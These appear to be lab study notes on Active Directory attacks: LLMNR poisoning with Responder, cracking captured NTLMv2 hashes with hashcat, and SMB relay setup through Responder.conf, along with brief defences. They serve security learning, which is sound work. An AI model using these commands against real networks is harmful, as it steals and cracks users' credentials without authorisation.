[*] Initial Attack Vectors(Active Directory)

[*] LLMNR Poisoning

[*] LLMNR = Link-Local Multicast Name Resolution
[*] Was Previously Known As NBT-NS
[*] Key Flaw: The Services Utilize A User's Username And NTLMv2 Hash When Appropriately Responded To
[*] This Is A Kind Of MITM Attack
[*] Setps:

[*] Capturing NTLMv2 Hashes With Responder:

[*] Responder: https://github.com/SpiderLabs/Responder

[+] On Our Kali Machine, Run The Following Command

responder -I <Interface> -rdw

[*] Example: responder -I eth0 -rdwv

[*] Now As We Are n00bs. On Our Windows User Machine, Open Up Explorer Are Type On The Navigation Bar:

\\<Responder IP>

[*] Now On The Windows Machine You Will Get A Window Poped Up Saying Enter Credentials And Access Is Denied
[*] No Problem As We Got Our Hashes On Our Kali Machine. Copy The Full Hash Including The Root Domain Name, Username And Everything. 

[*] Password Cracking With Hashcat:

[*] Paste Your Hash In A Text File(.txt)
[*] We Are Going To Use The Rockyou Wordlist(Built-In In Kali)
[*] Command:

hashcat -m 5600 <HashFile.txt> <Wordlist> --force

[*] This May Not Work. If This Doesn't Work, Download Hashcat On Your Windows Machine(Host) As Our Virtual Machines Have Less Memory Access
[*] You Have To Run The Command In Command Prompt(As Administrator)
[*] But Berfore Running Be Sure To Copy Rockyou To The Windows Machine
[*] The Command:

hashcat.exe -m 5600 <HashFile.txt> <Wordlist> -O

[*] Success! Hash Was Cracked

[*] Defences:

[*] Best Defence: Disable LLMNR And NBT-NS
[*] If Not Possible: Require Network Access Control And Use Harder Password. Passsword > 14 Characters

[*] SMB Relay Attacks:

[*] Explaination:

[*] Instead Of Cracking Hashes Gathered With Responder, We Can Instead Relay Those Hashes To Specific Machines And Potentially Gain Access. 

[*] Requirements:

[*] SMB Signing Must Be Disabled
[*] Relayed User Credentials Must Be An Admin On Machine

[*] To Do This You May Have To Modify The Responder.conf File. 

[Responder Core]

; Servers To Start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On

[*] Here Make Sure That SMB And HTTP Are "Turned Off"